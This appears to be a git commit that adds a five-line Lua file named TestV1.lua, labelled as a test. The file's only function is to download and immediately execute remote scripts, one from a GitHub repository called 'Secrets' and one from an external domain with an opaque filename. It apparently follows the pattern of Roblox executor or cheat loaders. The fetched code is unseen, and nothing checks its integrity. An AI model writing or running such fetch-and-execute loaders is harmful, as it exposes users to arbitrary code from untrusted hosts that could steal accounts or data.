77b3788c589cedd10b14c6112b3e922df3ee78f8
DoliScriptz <132125366+DoliScriptz@users.noreply.github.com>
2024-09-15 21:44:46 +0700

    Create TestV1.lua For test

---
+++ TestV1.lua
@@ -0,0 +1,5 @@
+getgenv().gui = false
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DoliScriptz/Secrets/main/main.lua"))()
+
+loadstring(game:HttpGet("https://egorikusa.space/0067dfd7ec316ff2d6446c5f.lua", true))()
